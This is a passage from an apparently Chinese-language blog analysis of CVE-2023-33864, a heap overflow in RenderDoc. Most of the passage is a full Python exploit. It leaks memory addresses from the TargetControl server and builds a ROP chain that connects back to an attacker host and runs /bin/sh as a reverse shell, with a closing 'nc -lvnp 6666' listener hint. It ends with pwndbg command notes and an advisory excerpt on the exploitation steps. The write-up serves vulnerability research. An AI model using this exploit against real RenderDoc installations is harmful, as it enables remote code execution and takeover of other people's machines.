        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">thread stack leak </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
        
		<span class="c1"># step 2：
</span>    <span class="c1"># ePacket_Handshake | ChunkCallstackFlag
</span>    <span class="c1"># + CallstackSize (实际会分配 CallstackSize x 8 大小的堆块)
</span>    <span class="c1"># + CallstackContent 
</span>    <span class="c1"># + p32(1)   
</span>    <span class="c1"># + clientname 的长度
</span>    <span class="c1"># + clientname  
</span>    <span class="c1"># + p32(0xe)是控制 m_ChunkMetadata.length 字段的
</span>    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span> <span class="o">|</span> <span class="n">ChunkCallstackFlag</span><span class="p">)</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x26</span><span class="p">)</span> \
            <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x01\x01\x01\x01\x01\x01\x01\x01</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x26</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0xe</span><span class="p">)</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">ts588</span><span class="sh">'</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x02</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">54</span>
    
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="c1"># step 3:
</span>    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span> <span class="o">|</span> <span class="n">ChunkCallstackFlag</span><span class="p">)</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> \
            <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xff</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x200</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> \
            <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00\x00\x00\x01</span><span class="sh">'</span> \
            <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xfe</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1024</span> \
            <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xfd</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">1024</span> 
    
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    
    <span class="c1"># 0x90 是溢出边界
</span>    <span class="c1"># 任意控制相邻堆块的 prev_size 字段和 size 字段
</span>    <span class="c1"># packet = b'b' * 0x1000
</span>    <span class="c1"># 0xfffffffffec12000 是 0x13EE000 的负数的补码
</span>    <span class="c1"># glibc mmap的阈值是16MB
</span>    <span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x10050</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x145</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x26</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xfffffffffec12000</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x1bef007</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    
    <span class="c1"># step 4:
</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">step 4: create a temp thread</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">th_tmp</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">tmp_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">th_tmp</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="c1"># step 5:
</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">step 5: create a long-live thread, kick out previous tmp thread</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">th_long_live</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">long_live_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">th_long_live</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
    
    <span class="c1"># step 6: information leak
</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">step 6: leak the content of long-live thread stack</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    
    <span class="c1"># do not kick out the long-live thread
</span>    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> \
        <span class="nf">p32</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">qts588</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
        
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    
    <span class="n">recv_buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">recv_buf</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">recv_buf</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x10\x00\x00\x00\x03\x03\x03\x03</span><span class="sh">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">break</span>
    
    <span class="n">tag_index</span> <span class="o">=</span> <span class="n">recv_buf</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x10\x00\x00\x00\x03\x03\x03\x03</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">heap_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">recv_buf</span><span class="p">[</span><span class="n">tag_index</span><span class="o">+</span><span class="mi">80</span> <span class="p">:</span> <span class="n">tag_index</span><span class="o">+</span><span class="mi">88</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">text_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">recv_buf</span><span class="p">[</span><span class="n">tag_index</span><span class="o">+</span><span class="mi">88</span> <span class="p">:</span> <span class="n">tag_index</span><span class="o">+</span><span class="mi">96</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">libc_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">recv_buf</span><span class="p">[</span><span class="n">tag_index</span><span class="o">+</span><span class="mi">40</span> <span class="p">:</span> <span class="n">tag_index</span><span class="o">+</span><span class="mi">48</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
    
    <span class="n">heap_off</span> <span class="o">=</span> <span class="mh">0x7fe0edbff430</span> <span class="o">-</span> <span class="mh">0x7fe0ed400000</span>
    <span class="n">text_off</span> <span class="o">=</span> <span class="mh">0x7fe0f38350d4</span> <span class="o">-</span> <span class="mh">0x7fe0f21f7000</span>
    <span class="n">libc_off</span> <span class="o">=</span> <span class="mh">0x7f00168657af</span> <span class="o">-</span> <span class="mh">0x7f0016767000</span>
    <span class="n">binsh_off</span> <span class="o">=</span> <span class="mh">0x7f8b55bff3d0</span> <span class="o">-</span> <span class="mh">0x7f8b55400000</span>
    
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">-</span> <span class="n">heap_off</span>
    <span class="n">text_base</span> <span class="o">=</span> <span class="n">text_addr</span> <span class="o">-</span> <span class="n">text_off</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">-</span> <span class="n">libc_off</span>
    
    <span class="n">dup2_addr</span> <span class="o">=</span> <span class="mh">0x10EAE0</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x22000</span>
    <span class="n">execv_addr</span> <span class="o">=</span> <span class="mh">0xE32D0</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x22000</span>
    <span class="n">setsockopt_addr</span> <span class="o">=</span> <span class="mh">0x120960</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x22000</span>
    <span class="n">socket_addr</span> <span class="o">=</span> <span class="mh">0x1209C0</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x22000</span>
    <span class="n">connect_addr</span> <span class="o">=</span> <span class="mh">0x1203B0</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x22000</span>
    <span class="n">ret_addr</span> <span class="o">=</span> <span class="n">ret_offset</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rdi_ret_addr</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rsi_ret_addr</span> <span class="o">=</span> <span class="n">pop_rsi_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rax_ret_addr</span> <span class="o">=</span> <span class="n">pop_rax_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rbx_ret_addr</span> <span class="o">=</span> <span class="n">pop_rbx_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rcx_ret_addr</span> <span class="o">=</span> <span class="n">pop_rcx_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rdx_ret_addr</span> <span class="o">=</span> <span class="n">pop_rdx_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">xchg_rdi_rax_ret_addr</span> <span class="o">=</span> <span class="n">xchg_rdi_rax_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">binsh_off</span> <span class="o">+</span> <span class="n">heap_base</span>
    <span class="n">sockaddr_addr</span> <span class="o">=</span> <span class="n">binsh_addr</span> <span class="o">+</span> <span class="mh">0x8</span>
    
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">heap base address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">text base address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">libc base address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">dup2  address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">execve  address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">execv_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">ret gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rdi_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rsi_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">xchg_rdi_rax_ret gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">xchg_rdi_rax_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rax_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rax_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rbx_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rbx_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rcx_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rcx_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rdx_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">binsh address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="c1"># step 7: spawn a remote shell
</span>    <span class="c1"># fd = 6
</span>    <span class="n">rop_chain</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span>
    <span class="c1">#struct sockaddr_in
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x010011ac0a1a0002</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0000556b2b358120</span><span class="p">)</span>
    
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x26c</span>
    <span class="c1"># int fd = socket(AF_INET, SOCK_STREAM, 0);
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">socket_addr</span><span class="p">)</span>
    <span class="c1"># dup2(7, 0)
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
    <span class="c1"># dup2(7, 1)
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
    <span class="c1"># dup2(7, 2)
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
    <span class="c1"># connect(fd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr));
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">sockaddr_addr</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">connect_addr</span><span class="p">)</span>
    <span class="c1"># execv("/bin/sh", NULL)
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> 
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">execv_addr</span><span class="p">)</span>
    <span class="n">rop_chain</span><span class="p">.</span><span class="nf">rjust</span><span class="p">(</span><span class="mh">0x900000</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="p">)</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
             <span class="nf">p32</span><span class="p">(</span><span class="mh">0x900000</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop_chain</span> <span class="o">+</span> \
             <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
             
    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">**** enjoy reverse shell on </span><span class="sh">'</span><span class="s">$ nc -lvnp 6666</span><span class="sh">'</span><span class="s">  ****</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>运行结果：</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-05-21_093704.png" alt="批注 2025-05-21 093704.png" /></p>

<h1 id="pwndbg命令学习">pwndbg命令学习</h1>

<ul>
  <li>info thread：查看线程信息</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; info thread
  Id   Target Id                                          Frame 
  1    Thread 0x7f500cf56dc0 <span class="o">(</span>LWP 2989<span class="o">)</span> <span class="s2">"sleep"</span>           0x00007f500d54223f <span class="k">in </span>__GI___clock_nanosleep <span class="o">(</span><span class="nv">clock_id</span><span class="o">=</span>clock_id@entry<span class="o">=</span>0, 
    <span class="nv">flags</span><span class="o">=</span>flags@entry<span class="o">=</span>0, <span class="nv">req</span><span class="o">=</span>0x7ffd00b15e60, <span class="nv">rem</span><span class="o">=</span>0x0<span class="o">)</span> at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
<span class="k">*</span> 2    Thread 0x7f500cf53700 <span class="o">(</span>LWP 2991<span class="o">)</span> <span class="s2">"TargetControlSe"</span> 0x00007f500d54223f <span class="k">in </span>__GI___clock_nanosleep <span class="o">(</span><span class="nv">clock_id</span><span class="o">=</span>clock_id@entry<span class="o">=</span>0, 
    <span class="nv">flags</span><span class="o">=</span>flags@entry<span class="o">=</span>0, <span class="nv">req</span><span class="o">=</span>req@entry<span class="o">=</span>0x7f500cf52ae0, <span class="nv">rem</span><span class="o">=</span>rem@entry<span class="o">=</span>0x0<span class="o">)</span> at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
</code></pre></div></div>

<ul>
  <li>thread id：切换到线程id，后面的heap等命令查看的就是某个线程的堆了</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; thread 2
<span class="o">[</span>Switching to thread 2 <span class="o">(</span>Thread 0x7f500cf53700 <span class="o">(</span>LWP 2991<span class="o">))]</span>
<span class="c">#0  0x00007f500d54223f in __GI___clock_nanosleep (clock_id=clock_id@entry=0, flags=flags@entry=0, req=req@entry=0x7f500cf52ae0, </span>
    <span class="nv">rem</span><span class="o">=</span>rem@entry<span class="o">=</span>0x0<span class="o">)</span> at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
78      <span class="k">in</span> ../sysdeps/unix/sysv/linux/clock_nanosleep.c
</code></pre></div></div>

<ul>
  <li>ignore break_point_num NUM：break_point_num 断点命中第NUM次后断下</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; info <span class="nb">break
</span>Num     Type           Disp Enb Address            What
4       breakpoint     keep y   0x00007f4d57ced01e <span class="k">in </span>RenderDoc::TargetControlServerThread<span class="o">(</span>Network::Socket<span class="k">*</span><span class="o">)</span> at /test/renderdoc/renderdoc/core/target_control.cpp:473
        breakpoint already hit 9 <span class="nb">times
</span>pwndbg&gt; ignore 4 8
Will ignore next 8 crossings of breakpoint 4.
</code></pre></div></div>

<h1 id="参考资料">参考资料</h1>

<p><a href="http://tukan.farm/2016/07/27/munmap-madness/">munmap madness · Online tukan sanctuary</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Exploitation
------------------------------------------------------------------------

1/ When librenderdoc.so's server thread is created, the glibc's malloc
allocates a new "heap" for this thread: 64MB of mmap()ed memory, whose
start address is aligned on a multiple of 64MB. Initially, this heap is
mmap()ed PROT_NONE, and is mprotect()ed read-write as needed by malloc:

    0                                       64M
----V----------------------------------------V--------------|-------------
    |          server thread's heap          |  random gap  |  libraries
----|----------------------------------------|--------------|-------------

Note: the gap of unmapped memory between the heap and the libraries is
random (and smaller than 64MB), because the heap is aligned on 64MB but
the libraries are randomly aligned on 4KB (or sometimes 2MB) by ASLR.

2/ We (remote attackers) establish 7 successive connections to the
server on TCP port 38920: for each one of these connections, the server
creates a new thread (a "client thread"), allocates a new thread stack
(8MB+4KB of mmap()ed memory, for the stack and its guard page), and then
memory-leaks this stack (because the server does not call pthread_join()
when the client thread terminates abnormally, which prevents its stack
from being freed or reused for another client thread).

The goal of this step 2/ is simply to fill the random gap between the
heap and the libraries (with the help of a memory leak), to prevent any
future thread stack from being allocated into this gap. The reason for
doing this will become clear in step 7/.

3/ We connect to the server on TCP port 38920, send a handshake packet
that contains a 16MB client-name string (it must be longer than 10MB to
trigger CVE-2023-33864), and obtain the following layout for the
server's heap:

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|               ....
--|-+-+-+-+---------------------------------------------------------------

- F are fixed chunks of memory (at the very beginning of the heap) that
  were not allocated by us but whose sizes are known to us;

- I is the 64KB intermediary buffer mentioned in the previous section;

- L is a small chunk that was memory-leaked (or free()d but stored in an
  otherwise unused tcache) and whose size is exactly controlled by us;

